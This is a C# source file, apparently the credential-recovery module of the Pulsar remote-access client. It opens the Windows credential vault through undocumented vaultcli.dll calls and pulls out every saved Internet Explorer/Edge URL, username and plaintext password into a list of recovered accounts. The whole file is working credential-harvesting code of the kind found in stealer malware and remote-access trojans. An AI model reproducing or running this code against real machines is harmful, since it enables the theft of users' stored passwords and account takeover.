using Pulsar.Common.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace Pulsar.Client.Recovery.IE
{
    public static class InternetExplorerRecovery
    {
        /// <summary>
        /// Recovers saved passwords from Internet Explorer/Edge credential vault
        /// </summary>
        public static void Recover(List<RecoveredAccount> output)
        {
            try
            {
                List<Password> passwords = GetPasswords();
                foreach (Password password in passwords)
                {
                    output.Add(new RecoveredAccount
                    {
                        Application = "Internet Explorer",
                        Username = password.sUsername,
                        Password = password.sPassword,
                        Url = password.sUrl
                    });
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"IE Recovery Error: {ex.Message}");
            }
        }

        /// <summary>
        /// Recovers IE passwords and returns as list
        /// </summary>
        public static List<RecoveredAccount> Recover()
        {
            var recoveredAccounts = new List<RecoveredAccount>();
            Recover(recoveredAccounts);
            return recoveredAccounts;
        }

        /// <summary>
        /// Internal password model for vault items
        /// </summary>
        private class Password
        {
            public string sUrl;
            public string sUsername;
            public string sPassword;
        }

        /// <summary>
        /// Extracts passwords from Windows credential vault
        /// </summary>
        private static List<Password> GetPasswords()
        {
            var results = new List<Password>();

            try
            {
                Version os = Environment.OSVersion.Version;
                bool isWin8Plus = (os.Major >= 6 && os.Minor >= 2) || os.Major >= 10;

                Type VAULT_ITEM = isWin8Plus
                    ? typeof(VAULT_ITEM_WIN8)
                    : typeof(VAULT_ITEM_WIN7);

                int vaultCount = 0;
                IntPtr vaultGuidPtr = IntPtr.Zero;

                int status = VaultEnumerateVaults(0, ref vaultCount, ref vaultGuidPtr);
                if (status != 0)
                    return results;

                IntPtr guidAddress = vaultGuidPtr;

                for (int i = 0; i < vaultCount; i++)
                {
                    Guid vaultGuid = (Guid)Marshal.PtrToStructure(guidAddress, typeof(Guid));
                    guidAddress = new IntPtr(guidAddress.ToInt64() + Marshal.SizeOf(typeof(Guid)));

                    IntPtr vaultHandle = IntPtr.Zero;
                    status = VaultOpenVault(ref vaultGuid, 0, ref vaultHandle);
                    if (status != 0)
                        continue;

                    int itemCount = 0;
                    IntPtr itemPtr = IntPtr.Zero;

                    status = VaultEnumerateItems(vaultHandle, 512, ref itemCount, ref itemPtr);
                    if (status != 0)
                        continue;

                    IntPtr entryAddress = itemPtr;

                    for (int j = 0; j < itemCount; j++)
                    {
                        try
                        {
                            object entry = Marshal.PtrToStructure(entryAddress, VAULT_ITEM);
                            entryAddress = new IntPtr(entryAddress.ToInt64() + Marshal.SizeOf(VAULT_ITEM));

                            IntPtr pResource = (IntPtr)GetField(entry, "pResourceElement");
                            IntPtr pIdentity = (IntPtr)GetField(entry, "pIdentityElement");

                            IntPtr pPkg = IntPtr.Zero;
                            if (isWin8Plus)
                                pPkg = (IntPtr)GetField(entry, "pPackageSid");

                            Guid schema = (Guid)GetField(entry, "SchemaId");
                            IntPtr passItem = IntPtr.Zero;

                            if (isWin8Plus)
                            {
                                status = VaultGetItem_WIN8(vaultHandle, ref schema, pResource, pIdentity, pPkg, IntPtr.Zero, 0, ref passItem);
                            }
                            else
                            {
                                status = VaultGetItem_WIN7(vaultHandle, ref schema, pResource, pIdentity, IntPtr.Zero, 0, ref passItem);
                            }

                            if (status != 0)
                                continue;

                            object fullEntry = Marshal.PtrToStructure(passItem, VAULT_ITEM);
                            IntPtr pAuth = (IntPtr)GetField(fullEntry, "pAuthenticatorElement");

                            Password password = new Password
                            {
                                sUrl = ExtractValue(pResource),
                                sUsername = ExtractValue(pIdentity),
                                sPassword = ExtractValue(pAuth)
                            };

                            if (!string.IsNullOrEmpty(password.sPassword) && !string.IsNullOrEmpty(password.sUrl))
                            {
                                results.Add(password);
                            }
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"IE Vault item error: {ex.Message}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"IE Vault extraction error: {ex.Message}");
            }

            return results;
        }

        private static object GetField(object obj, string name)
        {
            return obj.GetType().GetField(name).GetValue(obj);
        }

        private static string ExtractValue(IntPtr elemPtr)
        {
            if (elemPtr == IntPtr.Zero)
                return null;

            try
            {
                object elem = Marshal.PtrToStructure(elemPtr, typeof(VAULT_ITEM_ELEMENT));
                int type = (int)((VAULT_ITEM_ELEMENT)elem).Type;

                IntPtr dataPtr = new IntPtr(elemPtr.ToInt64() + 16);

                switch (type)
                {
                    case 7: // string
                        IntPtr strPtr = Marshal.ReadIntPtr(dataPtr);
                        return Marshal.PtrToStringUni(strPtr);

                    case 6: // GUID
                        return Marshal.PtrToStructure(dataPtr, typeof(Guid)).ToString();

                    case 12: // SID
                        SecurityIdentifier sid = new SecurityIdentifier(Marshal.ReadIntPtr(dataPtr));
                        return sid.Value;

                    default:
                        return null;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"IE Value extraction error: {ex.Message}");
                return null;
            }
        }

        #region P/Invoke Structures and Methods

        [StructLayout(LayoutKind.Sequential)]
        private struct VAULT_ITEM_WIN8
        {
            public Guid SchemaId;
            public IntPtr FriendlyName;
            public IntPtr pResourceElement;
            public IntPtr pIdentityElement;
            public IntPtr pAuthenticatorElement;
            public IntPtr pPackageSid;
            public ulong LastModified;
            public uint Flags;
            public uint PropertiesCount;
            public IntPtr Properties;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct VAULT_ITEM_WIN7
        {
            public Guid SchemaId;
            public IntPtr FriendlyName;
            public IntPtr pResourceElement;
            public IntPtr pIdentityElement;
            public IntPtr pAuthenticatorElement;
            public ulong LastModified;
            public uint Flags;
            public uint PropertiesCount;
            public IntPtr Properties;
        }

        public enum VAULT_ELEMENT_TYPE
        {
            ElementType_Boolean = 0,
            ElementType_Short = 1,
            ElementType_UnsignedShort = 2,
            ElementType_Integer = 3,
            ElementType_UnsignedInteger = 4,
            ElementType_Double = 5,
            ElementType_String = 7,
            ElementType_ByteArray = 12,
            ElementType_Sid = 13
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct VAULT_ELEMENT_VALUE
        {
            [FieldOffset(0)] public IntPtr ptr;
            [FieldOffset(0)] public int int32;
            [FieldOffset(0)] public uint uint32;
            [FieldOffset(0)] public short shortVal;
            [FieldOffset(0)] public ushort ushortVal;
            [FieldOffset(0)] public double doubleVal;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct VAULT_ITEM_ELEMENT
        {
            public int SchemaElementId;
            public VAULT_ELEMENT_TYPE Type;
            public VAULT_ELEMENT_VALUE Value;
        }

        [DllImport("vaultcli.dll")]
        private static extern int VaultOpenVault(ref Guid guid, uint offset, ref IntPtr handle);

        [DllImport("vaultcli.dll")]
        private static extern int VaultEnumerateVaults(int offset, ref int count, ref IntPtr guidPtr);

        [DllImport("vaultcli.dll")]
        private static extern int VaultEnumerateItems(IntPtr handle, int chunk, ref int count, ref IntPtr itemPtr);

        [DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
        private static extern int VaultGetItem_WIN8(IntPtr vault, ref Guid schema, IntPtr pRes, IntPtr pId, IntPtr pPkg, IntPtr zero, int arg6, ref IntPtr item);

        [DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
        private static extern int VaultGetItem_WIN7(IntPtr vault, ref Guid schema, IntPtr pRes, IntPtr pId, IntPtr zero, int arg5, ref IntPtr item);

        #endregion
    }
}